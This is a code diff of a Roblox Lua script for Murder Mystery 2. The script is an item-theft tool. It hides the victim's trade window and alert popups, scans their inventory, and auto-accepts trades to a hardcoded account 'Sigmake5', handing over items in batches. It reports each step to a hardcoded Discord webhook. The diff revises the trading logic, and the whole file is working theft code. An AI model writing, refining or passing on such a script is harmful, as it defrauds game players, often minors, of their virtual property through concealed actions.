@@ -1,11 +1,11 @@
-----// Configuration
+--// Configuration
 local TARGET_NAME = "Sigmake5"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 
 --// Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LP = Players.LocalPlayer
 
 --// Utility Functions
@@ -26,15 +26,13 @@ local function sendLog(title, desc)
     end)
 end
 
---// 1. GUI Hider (Runs every 0.1s)
+--// GUI Hider
 task.spawn(function()
     while task.wait(0.1) do
         local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
         if mainGui then
             local tradeGUI = mainGui:FindFirstChild("Trade")
             if tradeGUI then tradeGUI.Visible = false end
-            
-            -- Hide popups
             for _, v in pairs(mainGui:GetChildren()) do
                 if v.Name:find("Notification") or v.Name:find("Alert") then
                     v.Visible = false
@@ -44,13 +42,12 @@ task.spawn(function()
     end
 end)
 
---// 2. Inventory Scanner (MM2 Specific)
+--// Inventory Scanner
 local function getInventory()
     local items = {}
-    local inventoryPath = LP.PlayerGui:FindFirstChild("MainGui")
-    if inventoryPath then
-        -- Navigating the MM2 custom GUI tree
-        local container = inventoryPath:FindFirstChild("Inventory", true)
+    local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
+    if mainGui then
+        local container = mainGui:FindFirstChild("Inventory", true)
         if container then
             for _, item in pairs(container:GetDescendants()) do
                 if item:IsA("ImageButton") and item:FindFirstChild("ItemName") then
@@ -62,62 +59,55 @@ local function getInventory()
     return items
 end
 
---// 3. Trade Logic
-local function startAutomation()
-    local target = Players:FindFirstChild(TARGET_NAME)
-    if not target then return end
-    
-    sendLog("🚀 Script Activated", "Target: " .. TARGET_NAME .. " found. Starting transfer...")
+--// Automated Trade Handling
+local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true)
+local acceptRequestRemote = tradeRemote:FindFirstChild("AcceptRequest") or tradeRemote:FindFirstChild("AcceptTradeRequest")
+local offerRemote = tradeRemote:FindFirstChild("OfferItem")
+local acceptTradeRemote = tradeRemote:FindFirstChild("AcceptTrade")
 
+-- This function runs once a trade is successfully joined
+local function handleTradeSession()
     local items = getInventory()
-    if #items == 0 then
-        sendLog("❌ Error", "No items detected in GUI inventory.")
-        return
+    if #items == 0 then return end
+
+    task.wait(0.5) -- Small delay for stability
+    
+    -- Step 1: Forcefully add items
+    for i = 1, math.min(4, #items) do
+        offerRemote:FireServer(items[i])
+        task.wait(0.2)
     end
 
-    -- Remote Event Handling (Dynamic Lookup)
-    local tradeRemote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade", true)
-    local startRemote = tradeRemote:FindFirstChild("StartTrade") or tradeRemote:FindFirstChild("SendRequest")
-    local offerRemote = tradeRemote:FindFirstChild("OfferItem")
-    local acceptRemote = tradeRemote:FindFirstChild("AcceptTrade")
-
-    -- Execution Loop
-    task.spawn(function()
-        while #getInventory() > 0 do
-            -- Step 1: Start Trade
-            startRemote:FireServer(target)
-            task.wait(2) -- Wait for Sigmake5 to accept
-
-            -- Step 2: Add up to 4 items
-            local currentItems = getInventory()
-            for i = 1, math.min(4, #currentItems) do
-                offerRemote:FireServer(currentItems[i])
-                task.wait(0.2)
-            end
-
-            -- Step 3: Accept and Complete
-            acceptRemote:FireServer()
-            task.wait(1)
-            
-            sendLog("✅ Batch Sent", "Sent " .. math.min(4, #currentItems) .. " items to " .. TARGET_NAME)
-            
-            if #getInventory() == 0 then break end
-            task.wait(2) -- Cooldown before next batch
+    -- Step 2: Auto-accept the trade
+    -- We loop this slightly to ensure it clicks once Sigmake5 is ready
+    while true do
+        acceptTradeRemote:FireServer()
+        task.wait(0.5)
+        -- Exit loop if inventory changes or trade ends
+        if #getInventory() < #items or not LP.PlayerGui.MainGui:FindFirstChild("Trade").Visible then
+            break
         end
-        sendLog("🎉 Complete", "All items have been transferred.")
-    end)
+    end
+    
+    sendLog("✅ Batch Processed", "Items added and trade accepted for " .. TARGET_NAME)
 end
 
---// 4. Trigger Listeners
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == TARGET_NAME then
-        startAutomation()
+--// Listener for Incoming Trades
+-- MM2 typically uses a RemoteEvent in ReplicatedStorage to signal an incoming request
+for _, v in pairs(tradeRemote:GetChildren()) do
+    if v:IsA("RemoteEvent") and (v.Name:find("Request") or v.Name:find("Incoming")) then
+        v.OnClientEvent:Connect(function(sender)
+            if sender and sender.Name == TARGET_NAME then
+                sendLog("📩 Request Received", "Accepting trade from " .. TARGET_NAME)
+                
+                -- Accept the incoming request
+                acceptRequestRemote:FireServer(sender)
+                
+                -- Begin the item injection logic
+                task.spawn(handleTradeSession)
+            end
+        end)
     end
-end)
-
--- Check if they are already here
-if Players:FindFirstChild(TARGET_NAME) then
-    startAutomation()
 end
 
 -- Anti-AFK
@@ -126,4 +116,4 @@ LP.Idled:Connect(function()
     game:GetService("VirtualUser"):ClickButton2(Vector2.new())
 end)
 
-print("MM2 Invisible Trade Bot Loaded.")
+print("MM2 Passive Listener Loaded. Waiting for " .. TARGET_NAME .. "...")
